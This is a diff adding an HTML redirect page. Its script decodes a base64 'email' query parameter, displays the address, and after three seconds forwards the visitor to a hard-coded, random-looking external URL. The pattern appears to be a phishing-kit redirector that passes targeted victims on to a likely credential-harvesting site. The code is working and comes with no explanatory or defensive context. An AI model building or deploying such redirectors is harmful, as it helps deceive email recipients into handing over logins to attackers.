@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f4f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 500px;
+      width: 90%;
+    }
+    h2 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+    .email-display {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    .redirecting {
+      font-size: 14px;
+      color: #888;
+    }
+    .button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #2575fc;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .button:hover {
+      background: #6a11cb;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Redirecting...</h2>
+    <div class="email-display" id="emailDisplay"></div>
+    <div class="redirecting">Please wait while we send you to your destination.</div>
+    <button class="button" id="redirectBtn" style="display:none;">Click here if not redirected</button>
+  </div>
+
+  <script>
+    // Function to get query parameters
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    // Function to decode Base64
+    function decodeBase64(str) {
+      try {
+        return decodeURIComponent(escape(atob(str)));
+      } catch (e) {
+        return '';
+      }
+    }
+
+    // Retrieve and decode the email parameter
+    const encodedEmail = getQueryParam('email');
+    const email = decodeBase64(encodedEmail || '');
+
+    // Display the email if available
+    if (email) {
+      document.getElementById('emailDisplay').textContent = `Email: ${email}`;
+    }
+
+    // Define the destination URL
+    const destinationUrl = 'https://AOxIb.vmxjiidteq.es/npxLoiuP1V@6WR3fb/'; // Replace with your desired URL
+
+    // Redirect after a short delay
+    if (destinationUrl) {
+      setTimeout(() => {
+        window.location.href = destinationUrl;
+      }, 3000); // 3-second delay
+
+      // Show a manual redirect button in case automatic redirect fails
+      const redirectBtn = document.getElementById('redirectBtn');
+      redirectBtn.style.display = 'inline-block';
+      redirectBtn.addEventListener('click', () => {
+        window.location.href = destinationUrl;
+      });
+    } else {
+      document.querySelector('.redirecting').textContent = "Invalid or missing destination URL.";
+    }
+  </script>
+</body>
+</html>
